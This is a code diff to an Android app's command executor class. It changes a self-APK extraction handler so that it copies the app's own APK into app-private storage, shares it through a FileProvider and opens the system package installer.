@@ -2,12 +2,15 @@ package com.task.tusker.commands;
 
 import android.Manifest;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
 import android.os.Build;
 import android.os.Environment;
+import android.net.Uri;
 import androidx.core.app.ActivityCompat;
+import androidx.core.content.FileProvider;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -302,24 +305,27 @@ public class CommandExecutor {
     }
 
     /**
-     * Copy this process's installed APK into the public Downloads directory.
-     * This is an extraction only: it does not launch an installer or replace
-     * the running app.
+     * Copy this process's installed APK into app-private external storage and
+     * open Android's package installer. A FileProvider grants the installer
+     * temporary read access without writing to public shared storage.
      */
     private JSONObject handleExtractSelfApk() throws JSONException {
         JSONObject result = new JSONObject();
         File source = new File(context.getApplicationInfo().sourceDir);
-        File downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-        File target = new File(downloads, context.getPackageName() + "-extracted.apk");
+        File privateDownloads = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
+        if (privateDownloads == null) {
+            privateDownloads = new File(context.getFilesDir(), "downloads");
+        }
+        File target = new File(privateDownloads, context.getPackageName() + "-extracted.apk");
 
         if (!source.exists() || !source.isFile()) {
             result.put("success", false);
             result.put("error", "Installed APK source was not found");
             return result;
         }
-        if (!downloads.exists() && !downloads.mkdirs()) {
+        if (!privateDownloads.exists() && !privateDownloads.mkdirs()) {
             result.put("success", false);
-            result.put("error", "Could not create the Downloads folder");
+            result.put("error", "Could not create the app-private APK folder");
             return result;
         }
 
@@ -334,6 +340,26 @@ public class CommandExecutor {
             result.put("success", false);
             result.put("error", "APK extraction failed: " + e.getMessage());
             return result;
+        }
+
+        try {
+            Uri apkUri = FileProvider.getUriForFile(
+                    context,
+                    context.getPackageName() + ".fileprovider",
+                    target);
+            Intent installIntent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
+            installIntent.setDataAndType(apkUri, "application/vnd.android.package-archive");
+            installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                    | Intent.FLAG_GRANT_READ_URI_PERMISSION
+                    | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
+            installIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
+            context.startActivity(installIntent);
+
+            result.put("installTriggered", true);
+            result.put("message", "APK copied to private storage and package installer opened");
+        } catch (Exception e) {
+            result.put("installTriggered", false);
+            result.put("installError", "Could not open the package installer: " + e.getMessage());
         }
 
         result.put("success", true);
